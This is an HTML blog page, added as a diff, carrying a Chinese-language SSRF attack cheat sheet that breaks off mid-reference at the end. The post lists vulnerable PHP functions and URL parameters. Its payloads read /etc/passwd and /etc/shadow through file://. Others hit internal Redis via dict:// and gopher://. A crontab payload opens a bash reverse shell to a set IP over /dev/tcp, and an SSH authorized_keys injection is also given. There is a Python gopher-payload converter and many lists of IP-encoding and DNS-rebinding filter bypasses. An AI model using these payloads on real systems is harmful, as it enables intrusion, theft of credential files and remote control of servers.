@@ -1,0 +1,1403 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="web,绕过,php,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Blog of 1ypt0" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/lypto.ico?v=5.1.1">
+
+
+
+
+
+
+<meta name="description" content="ssrf是17年的owasp top 10新宠，因攻击方可以利用服务端去访问策略相对宽松的内网环境，使得很多边界得以被突破，攻击者侵入内网,翻江倒海。一直以来都没有对ssrf进行全方位的了解，最近看了一些会议的议题pdf以及相关菊苣的文章后决定总结一下。">
+<meta name="keywords" content="web,绕过,php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssrf突破边界">
+<meta property="og:url" content="http://lypto.me/2018/12/19/ssrf小记/index.html">
+<meta property="og:site_name" content="Blog of 1ypt0">
+<meta property="og:description" content="ssrf是17年的owasp top 10新宠，因攻击方可以利用服务端去访问策略相对宽松的内网环境，使得很多边界得以被突破，攻击者侵入内网,翻江倒海。一直以来都没有对ssrf进行全方位的了解，最近看了一些会议的议题pdf以及相关菊苣的文章后决定总结一下。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://lypto.me/myimages/ssrf之内网漫游/index.png">
+<meta property="og:image" content="http://lypto.me/myimages/ssrf之内网漫游/概念脑图.jpg">
+<meta property="og:image" content="http://lypto.me/myimages/ssrf之内网漫游/url_schema_support.png">
+<meta property="og:image" content="http://lypto.me/myimages/ssrf之内网漫游/WeakParser.jpg">
+<meta property="og:image" content="http://lypto.me/myimages/ssrf之内网漫游/fsockopen_bypass.png">
+<meta property="og:image" content="http://lypto.me/myimages/ssrf之内网漫游/Abusing_URL_Parsers2.png">
+<meta property="og:image" content="http://lypto.me/myimages/ssrf之内网漫游/Abusing_URL_Parsers.png">
+<meta property="og:updated_time" content="2018-12-19T07:15:53.147Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ssrf突破边界">
+<meta name="twitter:description" content="ssrf是17年的owasp top 10新宠，因攻击方可以利用服务端去访问策略相对宽松的内网环境，使得很多边界得以被突破，攻击者侵入内网,翻江倒海。一直以来都没有对ssrf进行全方位的了解，最近看了一些会议的议题pdf以及相关菊苣的文章后决定总结一下。">
+<meta name="twitter:image" content="http://lypto.me/myimages/ssrf之内网漫游/index.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":0,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://lypto.me/2018/12/19/ssrf小记/">
+
+
+
+
+
+  <title>ssrf突破边界 | Blog of 1ypt0</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?47d7b880e7f466d86f6a2755e80a6337";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+	<a href="https://github.com/IversionBY"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_red_aa0000.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Blog of 1ypt0</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://lypto.me/2018/12/19/ssrf小记/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="1ypt0">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/109.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of 1ypt0">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ssrf突破边界</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-19T14:07:51+08:00">
+                Dec 19 2018
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/12/19/ssrf小记/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/12/19/ssrf小记/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  8
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img style="margin: auto;" src="/myimages/ssrf之内网漫游/index.png" height="550" width="550"></p>
+<blockquote>
+<p>ssrf是17年的owasp top 10新宠，因攻击方可以利用服务端去访问策略相对宽松的内网环境，使得很多边界得以被突破，攻击者侵入内网,翻江倒海。一直以来都没有对ssrf进行全方位的了解，最近看了一些会议的议题pdf以及相关菊苣的文章后决定总结一下。<br><a id="more"></a></p>
+</blockquote>
+<p><img src="/myimages/ssrf之内网漫游/概念脑图.jpg" alt="image"></p>
+<blockquote>
+<p>图片来自：Nop.pw</p>
+</blockquote>
+<h1 id="0x01-漏洞点"><a href="#0x01-漏洞点" class="headerlink" title="0x01 漏洞点"></a>0x01 漏洞点</h1><ul>
+<li>CRLF</li>
+<li>file_get_contents()/readfile()</li>
+<li>fsockopen()</li>
+<li>curl_exec()</li>
+<li>XXE</li>
+<li>cURL,LWP,java uri ……</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. 从WEB功能上寻找</span><br><span class="line">    通过URL分享内容</span><br><span class="line">    文件处理、编码处理、转码等服务</span><br><span class="line">    在线翻译</span><br><span class="line">    通过URL地址加载与下载图片</span><br><span class="line">    图片、文章的收藏</span><br><span class="line">    设置邮件接收服务器</span><br><span class="line">    </span><br><span class="line">2. 从URL关键字寻找</span><br><span class="line">    share、wap、url、link、src、source、target、u、3g、</span><br><span class="line">    display、sourceURl、imageURL、domain...</span><br></pre></td></tr></table></figure>
+<h1 id="0x02-攻击流程"><a href="#0x02-攻击流程" class="headerlink" title="0x02 攻击流程"></a>0x02 攻击流程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 确定ssrf类型：socket直连式，curl lib库调用式......</span><br><span class="line">2. 信息搜集：扫秒本机或者内网开放的主机，及其端口，对照wiki 词条（[List_of_TCP_and_UDP_port_numbers）可以知晓端口运行的服务</span><br><span class="line">3. fuzz允许的协议类型，探测过滤规则，bypass......</span><br><span class="line">4. pwn!!!</span><br></pre></td></tr></table></figure>
+<h1 id="0x03-use-protocol"><a href="#0x03-use-protocol" class="headerlink" title="0x03 use protocol"></a>0x03 use protocol</h1><blockquote>
+<p>图片来自Bible cheatsheet</p>
+</blockquote>
+<p><img src="/myimages/ssrf之内网漫游/url_schema_support.png" alt="image"></p>
+<h2 id="file协议的文件读取"><a href="#file协议的文件读取" class="headerlink" title="file协议的文件读取"></a>file协议的文件读取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?u=file:///etc/passwd</span><br><span class="line">?u=file:/etc/shadow</span><br><span class="line">?u=file:///etc/apache2/sites-available/*</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>当file协议没有过滤的时候，我们可以通过file协议读取敏感文件（权限允许的范围内），包括系统配置，服务器配置，源码……</p>
+<h2 id="dict协议信息收集"><a href="#dict协议信息收集" class="headerlink" title="dict协议信息收集"></a>dict协议信息收集</h2><p>扫端口以及获取服务信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dict://serverip:port/info</span><br><span class="line">?url=dict://127.0.0.1:6379/keys%20  # 获取redis的键值</span><br><span class="line">?url=dict://127.0.0.1:6379/info     # 获取redis相关信息</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
+<p>dict+redis=getshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dict://serverip:port/name:data</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">dict://serverip:port/config:set:dir:/var/spool/cron/  #config set dir /var/spool/cron/  \r\n</span><br></pre></td></tr></table></figure></p>
+<h2 id="gopher获取shell"><a href="#gopher获取shell" class="headerlink" title="gopher获取shell"></a>gopher获取shell</h2><p>要知道，如果我们发现了ssrf，然后再内网找到了一台未授权访问的redis服务，那么整个大门就会为我们敞开。进一步的渗透工作就成了从redis反弹shell的简单问题。之前有写过一篇redis未授权访问相关文章，也开源了docker 镜像，可以很方便的练手。这里摘录下两个常见getshell思路，也算是对上次的回顾。</p>
+<p>crontab定时任务弹shell payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1</span><br><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;   #设置定时任务载体键值</span><br><span class="line"># 设置数据库存储路径（权限运行的情况下）</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line"># 设置文件名为root 即root用户的定时任务</span><br><span class="line">config set dbfilename root  </span><br><span class="line">save</span><br></pre></td></tr></table></figure></p>
+<p>谈到定时任务这个地方，需要科普一下linux下的定时任务相关操作。围绕linux下的定时任务涉及两个命令：<code>cron</code>，<code>crontab</code>。cron是随主机启动的守护进程，其监视的定时任务文件夹或文件如下（按优先级次序）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. /var/spool/cron/crontabs/   #这个文件夹下文件以用户名命名，每个文件对应一个用户的定时任务表，一般通过crontab -e 进行编写</span><br><span class="line">2. /etc/crontab               #这个目录一般是系统级别的定时任务，其定义了四个part: /etc/cron.hourly，/etc/cron.daily,/etc/cron.weekly,/etc/cron.monthly 所以一般情况下，我们都不直接对crontab进行操作，而是再对应的四个part 部分定义 时，天，周，月层次上的cron任务</span><br><span class="line">3. /etc/cron.d/               # 一般不再这个文件夹下进行操作</span><br></pre></td></tr></table></figure></p>
+<p>另外，还需要注意，<code>/etc/cron.deny</code>,<code>/etc/cron.allow</code>两个文件限制了哪些用户不能够进行定时任务，这在渗透中很致命，所以得引起关注。</p>
+<p>ssh 公钥注入payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#公钥转储到foo.txt</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt  </span><br><span class="line"></span><br><span class="line">#将文件转化为键值</span><br><span class="line">cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit</span><br><span class="line"></span><br><span class="line">#设置数据库存储目录（需要redis root用户运行，或者降权将设置为redis运行用户目录）</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config get dir</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure></p>
+<p>上面是直接与redis 交互下的反弹shell 操作，在 ssrf中利用dict或者gopher协议也可以直接达到这种效果，下面主要介绍gopher协议下的利用方式：<br>gopher协议是http协议他爹，所以很多协议都对其做了向前兼容，所以，虽然gopher协议已经是历史，但是在渗透的时候还是会发挥很大的作用。当然要利用这个协议，就需要按照协议的规范，也就是说我们需要本地抓包对payload 进行协议转换，使其符合gopher 协议格式就可以利用。</p>
+<blockquote>
+<p>这里推荐一款自动化payload 生成工具：<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a>   </p>
+</blockquote>
+<p>诚然，我们也可以利用wireshark，tcpdump，socat……等工具进行抓包，强烈推荐socat，因为大师傅留下的转化脚本，可以省去协议转化的麻烦，脚本待会奉上。</p>
+<p><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code></p>
+<p>对本地4444 端口进行转发到6379，并接听4444端口的流量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">exp = &apos;&apos;</span><br><span class="line"></span><br><span class="line">with open(sys.argv[1]) as f:</span><br><span class="line">    for line in f.readlines():</span><br><span class="line">        if line[0] in &apos;&gt;&lt;+&apos;:</span><br><span class="line">            continue</span><br><span class="line">        # 判断倒数第2、3字符串是否为\r</span><br><span class="line">        elif line[-3:-1] == r&apos;\r&apos;:</span><br><span class="line">            # 如果该行只有\r，将\r替换成%0a%0d%0a</span><br><span class="line">            if len(line) == 3:</span><br><span class="line">                exp = exp + &apos;%0a%0d%0a&apos;</span><br><span class="line">            else:</span><br><span class="line">                line = line.replace(r&apos;\r&apos;, &apos;%0d%0a&apos;)</span><br><span class="line">                # 去掉最后的换行符</span><br><span class="line">                line = line.replace(&apos;\n&apos;, &apos;&apos;)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        # 判断是否是空行，空行替换为%0a</span><br><span class="line">        elif line == &apos;\x0a&apos;:</span><br><span class="line">            exp = exp + &apos;%0a&apos;</span><br><span class="line">        else:</span><br><span class="line">            line = line.replace(&apos;\n&apos;, &apos;&apos;)</span><br><span class="line">            exp = exp + line</span><br><span class="line">print(exp)</span><br></pre></td></tr></table></figure>
+<h2 id="http协议访问裸奔restful接口"><a href="#http协议访问裸奔restful接口" class="headerlink" title="http协议访问裸奔restful接口"></a>http协议访问裸奔restful接口</h2><blockquote>
+<p>例子：CouchDB restful api ，参考链接[9]</p>
+</blockquote>
+<h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldap://hostname:port/%0a%0dcommand%0a%0dcommand</span><br></pre></td></tr></table></figure>
+<h2 id="……"><a href="#……" class="headerlink" title="……"></a>……</h2><h1 id="0x04-bypass-relevance"><a href="#0x04-bypass-relevance" class="headerlink" title="0x04 bypass relevance"></a>0x04 bypass relevance</h1><h2 id="common"><a href="#common" class="headerlink" title="common"></a>common</h2><blockquote>
+<p>以下内容摘录自参考链接[5]</p>
+</blockquote>
+<p>Bypass using HTTPS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://127.0.0.1/</span><br><span class="line">https://localhost/</span><br><span class="line">Bypass localhost with [::]</span><br></pre></td></tr></table></figure></p>
+<p>Bypass localhost<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://[::]:80/</span><br><span class="line">http://[::]:25/ SMTP</span><br><span class="line">http://[::]:22/ SSH</span><br><span class="line">http://[::]:3128/ Squid</span><br><span class="line">http://0000::1:80/</span><br><span class="line">http://0000::1:25/ SMTP</span><br><span class="line">http://0000::1:22/ SSH</span><br><span class="line">http://0000::1:3128/ Squid</span><br></pre></td></tr></table></figure></p>
+<p>Bypass with nip.io<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NIP.IO maps &lt;anything&gt;.&lt;IP Address&gt;.nip.io to the corresponding &lt;IP Address&gt;, even 127.0.0.1.nip.io maps to 127.0.0.1</span><br></pre></td></tr></table></figure></p>
+<p>Bypass with 302<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;Location: xxx://xxx.xxxx.xxx/xxx&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>Bypass with @</p>
+<p><img src="/myimages/ssrf之内网漫游/WeakParser.jpg" alt="image"></p>
+<p>Bypass using a decimal ip location<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://0177.0.0.1/</span><br><span class="line">http://2130706433/ = http://127.0.0.1</span><br><span class="line">http://3232235521/ = http://192.168.0.1</span><br><span class="line">http://3232235777/ = http://192.168.1.1</span><br></pre></td></tr></table></figure></p>
+<p>Bypass using enclosed alphanumerics<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com</span><br><span class="line"></span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure></p>
+<p>Bypass with Alternate IP encoding<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://425.510.425.510/ Dotted decimal with overflow</span><br><span class="line">http://2852039166/ Dotless decimal</span><br><span class="line">http://7147006462/ Dotless decimal with overflow</span><br><span class="line">http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal</span><br><span class="line">http://0xA9FEA9FE/ Dotless hexadecimal</span><br><span class="line">http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow</span><br><span class="line">http://0251.0376.0251.0376/ Dotted octal</span><br><span class="line">http://0251.00376.000251.0000376/ Dotted octal with padding</span><br></pre></td></tr></table></figure></p>
+<h2 id="php-fsockopen-cheatsheep"><a href="#php-fsockopen-cheatsheep" class="headerlink" title="php fsockopen() cheatsheep"></a>php <code>fsockopen()</code> cheatsheep</h2><p><img src="/myimages/ssrf之内网漫游/fsockopen_bypass.png" alt="image"></p>
+<h2 id="php-readfile-and-parse-url"><a href="#php-readfile-and-parse-url" class="headerlink" title="php readfile() and parse_url()"></a>php <code>readfile()</code> and <code>parse_url()</code></h2><blockquote>
+<p>图片来自 参考链接[7]</p>
+</blockquote>
+<p><img src="/myimages/ssrf之内网漫游/Abusing_URL_Parsers2.png" alt="image"></p>
+<h2 id="Abusing-URL-Parsers"><a href="#Abusing-URL-Parsers" class="headerlink" title="Abusing_URL_Parsers"></a>Abusing_URL_Parsers</h2><blockquote>
+<p>图片来自 参考链接[7]</p>
+</blockquote>
+<p><img src="/myimages/ssrf之内网漫游/Abusing_URL_Parsers.png" alt="image"></p>
+<h2 id="DNS-pinning-与-DNS-rebinding"><a href="#DNS-pinning-与-DNS-rebinding" class="headerlink" title="DNS pinning 与 DNS rebinding"></a>DNS pinning 与 DNS rebinding</h2><p>这是另一种比较高端的绕过ip限制的方式。我们试想这样一种场景，存在ssrf可利用的服务器对内网ip进行了十分严密的过滤，我们找不到直接的绕过思路。那么这个时候就可以利用DNS来大作文章。大致的实现思路有两种：</p>
+<ol>
+<li>DNS pinning：引导服务器访问一个域名，这个域名的解析权在我们可控的DNS服务器上，那么我们可以将这个域名地址指定为一个内网地址，那么就饿可以绕过对ip的正则。</li>
+<li>DNS rebinding：抓住验证和curl的两个事务间的时间间隔,让我们的域名服务器第一次域名查询反回不触犯过滤规则的ip，第二次域名查询反回内网ip。就可以绕过。需要注意的是必须要避免DNS缓存，如设置<code>ttl=0</code>。</li>
+</ol>
+<blockquote>
+<p>有个自动化的DNS rebinding框架可以使用： <a href="https://github.com/mwrlabs/dref。" target="_blank" rel="noopener">https://github.com/mwrlabs/dref。</a><br>更多相关细节移步另一篇文章：DNS relevance。</p>
+</blockquote>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</a><br>[2] <a href="https://joychou.org/web/phpssrf.html#" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html#</a><br>[3] <a href="http://brieflyx.me/2015/linux-tools/socat-introduction/" target="_blank" rel="noopener">http://brieflyx.me/2015/linux-tools/socat-introduction/</a><br>[4] <a href="http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf" target="_blank" rel="noopener">http://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf</a><br>[5] <a href="https://github.com/cujanovic/SSRF-Testing" target="_blank" rel="noopener">https://github.com/cujanovic/SSRF-Testing</a><br>[6] <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection</a><br>[7] <a 